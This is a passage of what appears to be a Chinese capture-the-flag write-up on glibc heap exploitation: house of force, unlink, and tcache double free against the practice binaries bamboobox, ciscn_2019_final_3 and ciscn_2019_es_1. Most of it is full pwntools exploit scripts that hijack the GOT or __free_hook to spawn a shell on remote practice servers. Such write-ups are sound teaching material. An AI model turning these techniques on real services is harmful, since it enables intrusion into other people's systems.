<li>程序在开始时就申请了一个 chunk 用于存放两个函数指针</li>
<li>show </li>
<li>add：读取名字使用的是 <code>read</code> 函数，读取长度的参数是用户输入的 v2，而 read 的第三个参数是无符号整数，如果我们输入负数，就可以读取任意长度。所以这里存在<strong>任意长度堆溢出</strong>的漏洞。</li>
<li>change：重新输入 <code>name</code> 的长度进行写入，存在<strong>任意长度堆溢出</strong></li>
<li>remove：将对应物品的名字的大小置为 0，并将对应的 content 置为 NULL</li>
<li>magic 函数：读取 flag 并打印</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>覆盖某个指针为 magic 函数的指针，goodbye_message 函数在程序结束时调用，利用覆盖 goodbye_message 来控制程序流：</p>
<ol>
<li><p>申请一个 chunk</p>
<p><img src="/article/Heap_Exploitation/image-20211019162935944.png" alt="image-20211019162935944"></p>
</li>
<li><p>堆溢出修改 top chunk</p>
<p><img src="/article/Heap_Exploitation/image-20211019163644606.png" alt="image-20211019163644606"></p>
<p>目的地址是 <code>0xf87000</code> ，</p>
</li>
<li><p>向上申请 chunk，malloc（负数）</p>
<p>负数 =  0xf87000 - 0xf87050 - 0x10 = -96(-0x60)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(-<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20211019164429485.png" alt="image-20211019164429485"></p>
<p>下一个申请的 chunk 地址为 0x15e7000，由于 size 检测，所以申请大小为 0x10</p>
</li>
<li><p>申请 0x10 的chunk，写入 magic_addr</p>
<p><img src="/article/Heap_Exploitation/image-20211019164702377.png" alt="image-20211019164702377"></p>
</li>
</ol>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27833</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./bamboobox&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name of item:&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length of item name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name of the item:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(-<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(magic_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Unlink-1"><a href="#Unlink-1" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><ul>
<li>通过 unlink 把 chunk 移到存储 chunk 指针的内存处</li>
<li>覆盖 chunk 0 指针为 atoi 的 got 表地址并泄露。</li>
<li>覆盖 atoi 的 got 表为 system 函数地址</li>
<li>给出参数 ‘sh’，调用 atoi 函数拿 shell</li>
</ul>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27833</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc/libc-2.23.so&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name of item:&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length of item name:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name of the item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x30</span>) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h1><h2 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache double free"></a>tcache double free</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(target_addr)</span><br><span class="line">add(target_addr)</span><br><span class="line"></span><br><span class="line">add(payload)</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h2><h3 id="libc-2-27-tcache"><a href="#libc-2-27-tcache" class="headerlink" title="libc-2.27 tcache"></a>libc-2.27 tcache</h3><h3 id="功能函数-1"><a href="#功能函数-1" class="headerlink" title="功能函数"></a>功能函数</h3><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="/article/Heap_Exploitation/image-20211013203512811.png" alt="image-20211013203512811"></p>
<p>最多可申请<code>0x18</code>个chunk，size &lt;= 0x78（属于fastbin），<code>gift</code>给了chunk的地址</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="/article/Heap_Exploitation/image-20211013203604018.png" alt="image-20211013203604018"></p>
<p>只<code>free</code>却没有置零指针</p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>利用 tcache 机制进行 double free 漏洞利用</li>
<li>修改<code>tcache chunk</code>，让我们能通过修改<code>chunk size</code>，后用 <code>unsortbin</code>来泄漏<code>libc</code></li>
</ul>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_final_3&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27096</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_final_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;something\n&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift :0x&#x27;</span>)</span><br><span class="line">    addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">heap_addr = add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x70</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_addr - <span class="number">0x10</span></span><br><span class="line">heap_addr = heap_addr-<span class="number">0x11e60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr: &#x27;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk0_addr: &#x27;</span> + <span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x50</span>,p64(heap_addr))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x50</span>,p64(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xffffff05ffffffff</span>) + <span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x38</span> + p64(chunk0_addr+<span class="number">0x60</span>)	<span class="comment">#0x05是大小为0x60的chunk数量，</span></span><br><span class="line"><span class="comment"># chunk0_addr+0x60是chunk1的size位，下一个申请0x10的chunk即可修改size</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>))	<span class="comment">#修改chunk1的size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)	<span class="comment">#unsortbin</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk0_addr + <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x50</span>,<span class="string">&#x27;\xa0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena_addr = add(<span class="number">11</span>,<span class="number">0x50</span>,<span class="string">&#x27;&#x27;</span>) - <span class="number">96</span></span><br><span class="line">malloc_hook_addr = main_arena_addr - <span class="number">0x10</span></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">libc_base = malloc_hook_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h2><h3 id="功能函数-2"><a href="#功能函数-2" class="headerlink" title="功能函数"></a>功能函数</h3><h3 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h3><p><img src="/article/Heap_Exploitation/image-20211027205031221.png" alt="image-20211027205031221"></p>
<p>每一个堆块都有一个 0x20 大小的 chunk 来存储信息，最多申请 12 个堆块，没有限制申请堆块的大小</p>
<h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p><img src="/article/Heap_Exploitation/image-20211027205156459.png" alt="image-20211027205156459"></p>
<p>只对我们申请的 chunk 进行释放，并且没有置零，存在UAF漏洞</p>
<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><img src="/article/Heap_Exploitation/image-20211027205849157.png" alt="image-20211027205849157"></p>
<h3 id="利用思路1"><a href="#利用思路1" class="headerlink" title="利用思路1"></a>利用思路1</h3><ul>
<li>利用 tcache double free 泄漏堆地址，劫持 tcache chunk</li>
<li>释放一个 unsortbin，计算出 libc_base</li>
<li>利用 tcache double free 修改 __free_hook 指向 system</li>
</ul>
<h3 id="利用思路2"><a href="#利用思路2" class="headerlink" title="利用思路2"></a>利用思路2</h3><ul>
<li>直接申请一个大于0x400的 chunk，释放之后就是unsortbin</li>
<li>利用 tcache double free 修改 __free_hook 指向 system</li>
</ul>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">filename = <span class="string">&#x27;ciscn_2019_es_1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29846</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content,call</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size of compary\&#x27;s name&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;compary call:&#x27;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">tcache_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x330</span></span><br><span class="line">log.success(<span class="string">&#x27;tcache_addr: &#x27;</span> + <span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(tcache_addr+<span class="number">0x10</span>),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(tcache_addr+<span class="number">0x10</span>),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0xffffff03ffffffff</span>) + <span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x37</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook_addr = main_arena_addr - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;main_arena_addr: &#x27;</span> + <span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook_addr: &#x27;</span> + <span class="built_in">hex</span>(malloc_hook_addr))</span><br><span class="line">log.success(<span class="string">&#x27;free_hook: &#x27;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(free_hook),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(free_hook),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system_addr),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

















]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Heap</tag>
      </tags>
  </entry>
</search>
